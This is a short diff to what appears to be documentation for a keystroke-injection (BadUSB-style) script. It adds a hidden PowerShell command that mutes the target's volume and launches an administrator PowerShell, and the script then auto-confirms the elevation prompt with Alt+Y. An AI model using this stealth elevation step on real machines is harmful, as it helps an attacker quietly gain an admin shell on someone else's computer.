@@ -59,7 +59,8 @@ WinPrintLine exit
 ```bash
 Delay 1000
 GuiR
-WinPrintLine powershell Start-Process powershell -Verb runAs
+## Inicia Silenciado (Zera Volume Antes de Iniciar)
+WinPrintLine powershell -w h -c "$s=New-Object -ComObject WScript.Shell;1..50|%{$s.SendKeys([char]174)};start powershell -v runas"
 Delay 1000
 Press KEY_LEFT_ALT
 Press Y
